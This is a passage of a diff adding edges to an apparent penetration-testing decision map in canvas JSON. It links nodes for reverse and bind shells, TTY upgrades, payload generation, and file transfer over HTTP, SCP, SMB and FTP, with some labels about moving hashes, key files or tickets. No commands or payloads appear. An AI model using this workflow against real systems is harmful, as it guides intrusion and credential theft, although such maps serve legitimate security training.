+      "toEnd": "arrow",
+      "label": "A simple command works while a longer or nested payload fails"
+    },
+    {
+      "id": "method:transfer-text:enabled--next-1",
+      "fromNode": "method:transfer-text:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-text:next-1",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A tool/artifact must reach a target that can make an HTTP request"
+    },
+    {
+      "id": "method:transfer-text:enabled--next-2",
+      "fromNode": "method:transfer-text:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-text:next-2",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A secret-like value, key file, stored hash, challenge response or ticket"
+    },
+    {
+      "id": "method:transfer-ftp:start--discover",
+      "fromNode": "method:transfer-ftp:start",
+      "fromSide": "right",
+      "toNode": "method:transfer-ftp:discover",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "inspect this surface"
+    },
+    {
+      "id": "method:transfer-ftp:discover--interpret",
+      "fromNode": "method:transfer-ftp:discover",
+      "fromSide": "right",
+      "toNode": "method:transfer-ftp:interpret",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "interpret the evidence"
+    },
+    {
+      "id": "method:transfer-ftp:interpret--validate",
+      "fromNode": "method:transfer-ftp:interpret",
+      "fromSide": "bottom",
+      "toNode": "method:transfer-ftp:validate",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "still check"
+    },
+    {
+      "id": "method:transfer-ftp:validate--checks",
+      "fromNode": "method:transfer-ftp:validate",
+      "fromSide": "left",
+      "toNode": "method:transfer-ftp:checks",
+      "toSide": "right",
+      "toEnd": "arrow",
+      "label": "validation commands"
+    },
+    {
+      "id": "method:transfer-ftp:validate--enabled",
+      "fromNode": "method:transfer-ftp:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-ftp:enabled",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition confirmed"
+    },
+    {
+      "id": "method:transfer-ftp:validate--ruledout",
+      "fromNode": "method:transfer-ftp:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-ftp:ruledout",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition disproved here"
+    },
+    {
+      "id": "method:transfer-ftp:validate--unknown",
+      "fromNode": "method:transfer-ftp:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-ftp:unknown",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Evidence inconclusive"
+    },
+    {
+      "id": "method:transfer-ftp:enabled--action",
+      "fromNode": "method:transfer-ftp:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-ftp:action",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "review the documented sequence"
+    },
+    {
+      "id": "method:transfer-ftp:enabled--next-0",
+      "fromNode": "method:transfer-ftp:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-ftp:next-0",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A downloaded/generated artifact exists but does not run"
+    },
+    {
+      "id": "method:transfer-ftp:enabled--next-1",
+      "fromNode": "method:transfer-ftp:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-ftp:next-1",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A tool/artifact must reach a target that can make an HTTP request"
+    },
+    {
+      "id": "method:transfer-ftp:enabled--next-2",
+      "fromNode": "method:transfer-ftp:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-ftp:next-2",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "An SSH identity can access the needed source/destination"
+    },
+    {
+      "id": "route-2437",
+      "fromNode": "flow:sessions-transfers:check-0",
+      "fromSide": "right",
+      "toNode": "method:session-proof:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2438",
+      "fromNode": "flow:sessions-transfers:check-0-finding-0",
+      "fromSide": "right",
+      "toNode": "method:session-reverse:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2440",
+      "fromNode": "flow:sessions-transfers:check-0-fallback",
+      "fromSide": "right",
+      "toNode": "method:session-proof:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2441",
+      "fromNode": "flow:sessions-transfers:check-1",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2443",
+      "fromNode": "flow:sessions-transfers:check-1-finding-1",
+      "fromSide": "right",
+      "toNode": "method:transfer-scp:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2444",
+      "fromNode": "flow:sessions-transfers:check-1-finding-2",
+      "fromSide": "right",
+      "toNode": "method:transfer-smb:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2446",
+      "fromNode": "method:session-proof:next-0",
+      "fromSide": "right",
+      "toNode": "method:session-reverse:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2449",
+      "fromNode": "method:session-reverse:next-0",
+      "fromSide": "right",
+      "toNode": "method:session-tty:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2451",
+      "fromNode": "method:session-reverse:next-2",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2452",
+      "fromNode": "method:session-reverse:next-3",
+      "fromSide": "right",
+      "toNode": "method:session-bind:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2456",
+      "fromNode": "method:session-bind:next-0",
+      "fromSide": "right",
+      "toNode": "method:session-tty:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2458",
+      "fromNode": "method:session-bind:next-2",
+      "fromSide": "right",
+      "toNode": "method:session-proof:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2461",
+      "fromNode": "method:payload-generate:next-2",
+      "fromSide": "right",
+      "toNode": "method:session-proof:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2468",
+      "fromNode": "method:transfer-http:next-3",
+      "fromSide": "right",
+      "toNode": "method:transfer-smb:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2469",
+      "fromNode": "method:transfer-http:next-4",
+      "fromSide": "right",
+      "toNode": "method:transfer-stream:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2470",
+      "fromNode": "method:transfer-http:next-5",
+      "fromSide": "right",
+      "toNode": "method:transfer-text:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2471",
+      "fromNode": "method:transfer-http:next-6",
+      "fromSide": "right",
+      "toNode": "method:transfer-ftp:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2473",
+      "fromNode": "method:transfer-scp:next-1",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2477",
+      "fromNode": "method:transfer-smb:next-2",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2479",
+      "fromNode": "method:transfer-stream:next-1",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2482",
+      "fromNode": "method:transfer-text:next-1",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2485",
+      "fromNode": "method:transfer-ftp:next-1",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    },
+    {
+      "id": "route-2486",
+      "fromNode": "method:transfer-ftp:next-2",
+      "fromSide": "right",
+      "toNode": "method:transfer-scp:start",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Open command / decision map",
+      "color": "#627386"
+    }
+  ]
+}
